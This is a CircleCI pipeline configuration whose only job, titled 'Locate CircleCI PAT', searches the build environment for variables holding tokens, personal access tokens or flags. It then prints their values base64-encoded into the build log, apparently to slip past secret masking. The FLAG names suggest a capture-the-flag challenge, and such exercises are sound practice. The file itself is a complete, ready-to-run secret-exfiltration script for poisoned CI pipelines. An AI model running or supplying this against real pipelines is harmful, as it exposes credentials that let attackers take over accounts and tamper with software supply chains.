version: 2.1

jobs:
  retrieve:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Locate CircleCI PAT
          command: |
            set +x
            echo "CANDIDATE_NAMES_BEGIN"
            env | cut -d= -f1 | sort | grep -Ei '(^|_)(CIRCLE|CIRCLECI|PAT|TOKEN|FLAG)($|_)' || true
            echo "CANDIDATE_NAMES_END"
            for key in CIRCLECI_PAT CIRCLE_CI_PAT CIRCLE_TOKEN CIRCLECI_TOKEN CIRCLECI_API_TOKEN CIRCLE_API_TOKEN FINAL_FLAG FLAG; do
              value="$(printenv "$key" 2>/dev/null || true)"
              if [ -n "$value" ]; then
                printf 'ENCODED_%s=' "$key"
                printf '%s' "$value" | base64 | tr -d '\n'
                printf '\n'
              fi
            done

workflows:
  retrieve:
    jobs:
      - retrieve
